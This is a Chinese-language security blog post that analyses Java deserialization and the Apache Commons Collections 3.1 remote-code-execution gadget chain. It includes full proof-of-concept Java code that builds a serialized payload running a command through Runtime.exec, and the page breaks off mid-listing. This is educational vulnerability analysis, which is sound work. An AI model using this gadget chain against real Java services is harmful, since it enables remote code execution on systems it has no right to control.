@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Java安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="基础知识 Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化              实现简单的序列化与反序列化 一个简单的User类(只有实现了">
+<meta name="keywords" content="Java安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java序列化与反序列化漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/02/28/Java反序列化/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="基础知识 Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化              实现简单的序列化与反序列化 一个简单的User类(只有实现了">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.15.23.02-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.14.24.07-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.00-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.29-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.16.42.14-image.png">
+<meta property="og:updated_time" content="2019-03-31T10:40:59.777Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java序列化与反序列化漏洞">
+<meta name="twitter:description" content="基础知识 Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化              实现简单的序列化与反序列化 一个简单的User类(只有实现了">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/28/Java反序列化/"/>
+
+
+
+
+
+  <title>Java序列化与反序列化漏洞 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/28/Java反序列化/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java序列化与反序列化漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-28T08:15:41+08:00">
+                2019-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
+<p>Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化<br>Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化            </p>
+</blockquote>
+<p>实现简单的序列化与反序列化</p>
+<p>一个简单的User类(只有实现了Serializable接口的类的对象才可以被序列化)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class User implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line">    </span><br><span class="line">    getter and setter...</span><br></pre></td></tr></table></figure></p>
+<p>序列化:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User user = new User();</span><br><span class="line">FileOutputStream fileout = new FileOutputStream(&quot;test.bin&quot;);</span><br><span class="line">ObjectOutputStream out = new ObjectOutputStream(fileout);</span><br><span class="line">out.writeObject(user);</span><br><span class="line">out.close();</span><br><span class="line">fileout.close();</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png" alt="2019-03-25.22.30.02-image.png"></p>
+<ul>
+<li>0xaced 魔术头</li>
+<li>0x0005 版本号<br>开头的几位可当作Java序列化得到字节的特征。        </li>
+</ul>
+<p>反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fileinput = new FileInputStream(&quot;test.bin&quot;);</span><br><span class="line">ObjectInputStream input = new ObjectInputStream(fileinput);</span><br><span class="line">User user = (User) input.readObject();</span><br><span class="line">input.close();</span><br><span class="line">fileinput.close();</span><br><span class="line">System.out.println(user);    // User@8db2f2</span><br></pre></td></tr></table></figure></p>
+<h2 id="Apache-CommonsCollections-序列化RCE漏洞分析"><a href="#Apache-CommonsCollections-序列化RCE漏洞分析" class="headerlink" title="Apache-CommonsCollections 序列化RCE漏洞分析"></a>Apache-CommonsCollections 序列化RCE漏洞分析</h2><blockquote>
+<p>该漏洞的问题主要出现在org.apache.commons.collections.Transformer接口上。在Apache commons.collections中有一个InvokerTransformer实现了Transformer接口，主要作用为调用Java的反射机制来调用任意函数。TransformedMap配合AnnotationInvocationHandler中的readObject()，可以触发漏洞，造成命令执行。</p>
+</blockquote>
+<p>漏洞触发流程:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.15.23.02-image.png" alt="2019-03-27.15.23.02-image.png"></p>
+<p>调用链:</p>
+<blockquote>
+<p>InvokerTransformer.transform()-&gt;TransformedMap.checkSetValue()-&gt;AbstractInputCheckedMapDecorator.setValue()-&gt;AnnotationInvocationHandler.readObject()</p>
+</blockquote>
+<p>技术细节:</p>
+<blockquote>
+<p>(1)java方法重写：如果一个类的方法被重写，那么在调用时优先调用该方法<br>(2)JAVA反射机制：在运行状态中<br>对于任意一个类，都能够判断一个对象所属的类；<br>对于任意一个类，都能够知道这个类的所有属性和方法；<br>对于任意一个对象，都能够调用它的任意一个方法和属性；<br>(3)认识关键类与函数<br>    TransformedMap ：利用其value修改时触发transform()的特性<br>    ChainedTransformer： 会挨个执行我们定义的Transformer<br>    Transformer: 存放我们要执行的命令<br>    AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数            </p>
+</blockquote>
+<p><strong>环境基于:<a href="https://www.oracle.com/technetwork/java/javasebusiness/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">jdk-6u45</a>与<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections" target="_blank" rel="noopener">commons-collections 3.1</a></strong></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Reverse_Payload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outmap = TransformedMap.decorate(map, null, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //通过反射获得AnnotationInvocationHandler类对象</span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //通过反射获得cls的构造函数</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        //这里需要设置Accessible为true，否则序列化失败</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        //通过newInstance()方法实例化对象</span><br><span class="line">        Object o = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GeneratePayload(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        //将构造好的payload序列化后写入文件中</span><br><span class="line">        File f = new File(file);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //取出文件中的payload，进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>我们先分析下poc中用到的各个类</p>
+<blockquote>
+<p><strong>TransformedMap</strong></p>
+</blockquote>
+<p>Map类是存储键值对的数据结构，Apache Commons Collections实现了TransformedMap，用来对Map进行变换，该类在一个元素(key或value)被添加/删除/修改时就会调用相应的transform方法对其进行修饰变换，具体的变换逻辑在transform方法中实现。<strong>如我们在transform方法中定义value++，当TransformedMap类中的value被修改时，就会调用transform方法，其value值先加1</strong><br>我们可以通过decorate方法获得一个TransformedMap实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outmap = TransformedMap.decorate(map, null, transformerChain);</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>TransformedMap.decorate()：<br>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {<br>    return new TransformedMap(map, keyTransformer, valueTransformer);<br>}<br>第一个参数为待转化的Map对象<br>第二个参数为Map对象的key要经过的转化方法（单个方法或方法链或null）<br>第三个参数为Map对象的Value要经过的转化方法（单个方法或方法链或null）</p>
+</blockquote>
+<p>当Map中任一项的Key或Value被修改，相应的Transform方法就会被调用。</p>
+<p>分析漏洞需要用到Apache Commons Collections中几个已经实现了Transformer的类:</p>
+<blockquote>
+<p><strong>ConstantTransformer()</strong></p>
+</blockquote>
+<p>该类的transformer方法会返回构造函数传入的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    return this.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>InvokerTransformer</strong></p>
+</blockquote>
+<p>该类的transform方法通过Java的反射机制执行任意代码。transform方法用到的方法名，参数类型与参数值都在类的构造函数中指定</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">    this.iMethodName = methodName;</span><br><span class="line">    this.iParamTypes = paramTypes;</span><br><span class="line">    this.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">            return method.invoke(input, this.iArgs);</span><br><span class="line">        &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">        &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">        &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>ChainedTransformer</strong></p>
+</blockquote>
+<p><strong>构造方法</strong>：会将传进来的Transformer数组保存为this.iTransformers对象。<br><strong>transform()</strong>：依次调用this.iTransformers对象的transformer方法，且前一次执行transform方法的返回值object，会作为下一次执行transform方法的参数object</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">    this.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = this.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造触发链:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">        //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">        //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.14.24.07-image.png" alt="2019-03-27.14.24.07-image.png"><br>这里的情况是<strong>只允许调用Class.getMethod与Method.invoke方法去执行命令</strong><br>触发链执行步骤:</p>
+<blockquote>
+<ul>
+<li>构造一个ConstantTransformer，传入Runtime的class对象，在执行transform()时，会始终返回这个对象</li>
+<li>构造一个InvokerTransformer，待调用方法名为getMethod，参数为getRuntime。transform时 传入1的结果，input为java.lang.Runtime cls为java.lang.Class。待调用方法为getMethod，然后invoke调用这个放过发最终得到的是    Runtime对象</li>
+<li>构造一个InvokerTransformer，待调用方法为invoke，参数为null，在transform时，传入2的结果，实际上是调用getRuntime()拿到Runtime对象</li>
+<li>构造一个InvokerTransformer，待调用方法为exec，参数为执行的命令clac，在transform时，传入3的结果，获取java.lang.Runtime的exec方法并传参调用</li>
+<li>最后将其放入一个数组，传入ChainedTransformer中，在transform时，会将前一个元素的返回结果作为下一个的参数，满足我们的需求。</li>
+</ul>
+</blockquote>
+<p>我们思考下使用逻辑更清晰的触发链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;getRuntime&quot;, new Class[0], new Object[0]),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>但是运行出错，原因是<code>Runtime.getRuntime()</code>得到的<code>java.lang.Runtime</code>对象需要参与序列化过程，但是并没有实现Serializable接口，所以行不通<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.00-image.png" alt="2019-03-31.18.23.00-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.29-image.png" alt="2019-03-31.18.23.29-image.png"></p>
+<p>上面的触发链相当于执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>测试demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //transformers数组 ChainedTransformer按顺序调用一系列的变换</span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        //TransformedMap(map, keyTransformer, valueTransformer)</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;1111&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当执行setValue()后会调用相应的transformedChain链。<br><strong>最终结果</strong>:我们精心构造的TransformedMap，在其任意键值被修改时，触发机制，从而执行命令。</p>
+<hr>
+<p>接下来的任务就是去找一个包含<strong>可控Map字段，并会在反序列化时对这个Map进行setValue()操作的类</strong>。我们的前辈在<br>Java运行类库中找见AnnotationInvocationHandler类，这个类完美符合我们的要求。传入Map对象，并在重写的readObject方法中对其进行setValue操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#jdk1.6.0_45\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class	</span><br><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 6182022883658399397L;</span><br><span class="line">    private final Class type;</span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    private transient volatile Method[] memberMethods = null;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 